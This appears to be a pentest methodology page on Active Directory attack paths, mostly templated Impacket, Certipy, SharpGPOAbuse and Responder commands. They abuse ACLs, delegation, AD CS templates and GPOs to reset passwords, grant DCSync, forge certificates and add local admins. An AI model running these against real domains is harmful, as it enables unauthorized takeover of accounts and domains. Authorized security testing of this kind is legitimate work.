---
title: AD attack-path checks
order: 4
tags: [ad, acl, delegation, adcs, bloodhound]
---

## ACL abuse

- [ ] Identify the object type, controlled principal and effective permission.
- [ ] Check inheritance and protected-object restrictions.
- [ ] Match the operation to the object: a group, user, computer and GPO expose different paths.
- [ ] Confirm the resulting access before marking the path complete.

[GenericAll reference](https://bloodhound.specterops.io/resources/edges/generic-all).

## ACL abuse operations

Read the DACL first. Use the narrowest state-changing operation supported by the verified edge, and save enough evidence to restore the original state.

```bash
# Read the target DACL
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -principal '{{USER}}' -action read
# If WriteOwner is confirmed
impacket-owneredit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -new-owner '{{USER}}' -action write
# If WriteDacl is confirmed
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -principal '{{USER}}' -action write -rights ResetPassword
# DCSync rights against the domain root, only when the objective requires it
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{DOMAIN_DN}}' -principal '{{USER}}' -action write -rights DCSync
```

Reset a target password only after the required right is verified:

```bash
impacket-changepasswd -reset -protocol smb-samr '{{DOMAIN}}/{{TARGET_USER}}'@'{{DC}}' -newpass '{{NEW_PASS}}' -altuser '{{DOMAIN}}/{{USER}}' -altpass '{{PASS}}'
```

Record the original DACL or object state, the changed principal, target object, exact right, and cleanup requirement. [Impacket dacledit](https://github.com/fortra/impacket/blob/master/examples/dacledit.py), [Impacket owneredit](https://github.com/fortra/impacket/blob/master/examples/owneredit.py), [Impacket changepasswd](https://github.com/fortra/impacket/blob/master/examples/changepasswd.py).

## Delegation prerequisites

- [ ] Identify unconstrained, constrained or resource-based constrained delegation.
- [ ] Record the controlled service, permitted SPNs and required host control.
- [ ] For TGT capture, confirm an incoming usable TGT; protected accounts can prevent forwarding.

For delegation types other than RBCD, verify the exact abuse command against the discovered delegation type and installed tool version.

[TGT path prerequisites](https://bloodhound.specterops.io/resources/edges/coerce-to-tgt), [protected accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts).

## Resource-based constrained delegation

Use only after confirming write access to the target computer and a controlled machine account or machine-account quota. These operations modify AD.

```bash
# Create a controlled computer account when quota permits
impacket-addcomputer -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -computer-name 'FAKE01$' -computer-pass '{{COMPUTER_PASS}}'
# Allow the controlled account to impersonate users on the target
impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-from 'FAKE01$' -delegate-to '{{TARGET_COMPUTER}}$' -action write
# Request a ticket for the intended identity
impacket-getST -dc-ip '{{DC}}' -spn 'cifs/{{TARGET_COMPUTER}}.{{DOMAIN}}' -impersonate '{{TARGET_USER}}' '{{DOMAIN}}/FAKE01$:{{COMPUTER_PASS}}'
export KRB5CCNAME='{{TARGET_USER}}.ccache'
nxc smb '{{TARGET_COMPUTER}}' -k --kdcHost '{{DC}}' -u '{{TARGET_USER}}' -p '{{PASS}}'
```

Verify the ticket and resulting identity. Remove the RBCD entry when required:

```bash
impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-from 'FAKE01$' -delegate-to '{{TARGET_COMPUTER}}$' -action remove
```

[Impacket addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py), [Impacket rbcd](https://github.com/fortra/impacket/blob/master/examples/rbcd.py), [Impacket getST](https://github.com/fortra/impacket/blob/master/examples/getST.py).

## AD CS enrollment prerequisites

- [ ] Check enrollment rights, template publication, authentication EKUs and subject control.
- [ ] Check manager approval, required signatures, CA permissions and trust.
- [ ] Review missing CA/DC registry collection before trusting absent graph edges.
- [ ] Verify certificate authentication after issuance; issuance alone does not prove access.

[ESC1 conditions](https://bloodhound.specterops.io/resources/edges/adcs-esc1), [collector permissions](https://bloodhound.specterops.io/collect-data/sharphound-data-permissions).

## Certificate strong mapping after 2025

February 2025 updates made Full Enforcement the default. After the September 9, 2025 update, the compatibility registry override is unsupported. Verify the DC's patch state and strong certificate mapping before reusing older AD CS recipes. [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

## SMB signing prerequisites

Check the actual host and connection direction. Current Microsoft guidance distinguishes Server 2025 outbound defaults from Windows 11 24H2 edition-specific inbound/outbound defaults. A signing result alone does not establish an end-to-end relay path. [Microsoft signing guide](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing).

## LDAP signing and channel binding

Signing and TLS channel binding are separate controls. Server 2025 new deployments and upgrades can have different effective policies. Check both; an LDAPS endpoint alone does not prove relay resistance. [Signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing), [channel binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding).

## GPO permissions

When a controlled principal can edit a GPO that applies to a target computer, push a task or group change through it:

```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --GPOName "Default Domain Policy" --Command "cmd.exe" --Arguments "/c net localgroup administrators {{USER}} /add"
```

Confirm the GPO's scope links to an OU holding the target, then force a refresh or wait for policy application. [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).

## Capture coerced authentication

Start Responder on the interface reachable from the target. Use a controlled service action or UNC path to trigger authentication; do not enable unrelated poisoning or DHCP features by default.

```bash
sudo responder -I '{{INTERFACE}}' -v
```

For an MSSQL trigger, use [xp_dirtree](services/databases#mssql-unc-authentication). Save the captured account and format, then use [NetNTLMv2 mode 5600](active-directory/credential-access#crack-a-captured-netntlmv2-response) when applicable. A capture does not prove relay access. [Responder quick start and SMB capture](https://github.com/lgandx/Responder).

## Enumerate AD CS with Certipy

Use a valid domain account and the confirmed DC. Enumerate enabled templates and CAs before choosing any request.

```bash
certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -text
```

Verify enrollment rights, authentication EKU, subject control, approval and signature requirements, CA permissions and strong mapping. A vulnerability label is a lead that still needs the listed conditions. [Certipy usage](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage), [ESC conditions](https://posts.specterops.io/certified-pre-owned-d95910965cd2).

## Request and use an ESC1 certificate

Only after confirming ESC1 conditions. Set CA_HOST, CA, TEMPLATE, TARGET_USER and TARGET_SID from collected evidence. The request changes certificate state and must be within the authorized objective.

```bash
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}' -sid '{{TARGET_SID}}'
certipy auth -pfx '{{TARGET_USER}}.pfx' -dc-ip '{{DC}}'
```

The second command expects the PFX filename produced by the request. Verify authentication rather than treating issuance as proof. If PKINIT fails, assess Schannel/LDAPS and strong mapping instead of repeating the same command. [Certipy find, req and auth workflow](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage).

## ESC4 template modification

Use only when the current principal has verified write access to the template. Save the current template before changing it and restore it when required.

```bash
certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -vulnerable -text
certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -save-configuration '{{TEMPLATE}}.json'
certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -write-default-configuration -force
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}'
certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -write-configuration '{{TEMPLATE}}.json' -force
```

## ESC7 CA management

Use only when CA manager or certificate-manager rights are verified. Request approval and cleanup requirements before changing CA state.

```bash
certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -vulnerable -text
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -list-templates
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -add-officer '{{USER}}'
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -enable-template '{{TEMPLATE}}'
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}'
```

## ESC8 relay conditions

Use only after confirming Web Enrollment, a relay-capable authentication trigger, signing/channel-binding state, and an authorized objective. Avoid running another SMB listener on the same interface as the relay.

```bash
sudo certipy relay -target 'http://{{CA_HOST}}' -template Machine -interface '{{LHOST}}'
# Trigger authentication from the target with the confirmed MSSQL, RPC, or web mechanism.
```

A relayed certificate is not access by itself; authenticate with it and verify the resulting identity. [Certipy command reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).

## Certificate Schannel fallback

When PKINIT fails but the certificate is valid, test Schannel authentication to LDAP instead of repeating the same request.

```bash
certipy cert -pfx '{{TARGET_USER}}.pfx' -nokey -out '{{TARGET_USER}}.crt'
certipy cert -pfx '{{TARGET_USER}}.pfx' -nocert -out '{{TARGET_USER}}.key'
certipy auth -pfx '{{TARGET_USER}}.pfx' -dc-ip '{{DC}}' -ldap-shell
```

If Schannel works, perform only the required LDAP operation and verify the resulting identity. [Certipy auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).

## Shadow credentials with Certipy

Use only when the current principal has verified write permission for msDS-KeyCredentialLink on TARGET_USER. This modifies the target object; record the change and remove added credentials when required by the engagement.

```bash
certipy shadow auto -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -account '{{TARGET_USER}}'
```

Use the generated credential to authenticate as the target identity. [Certipy shadow command](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).
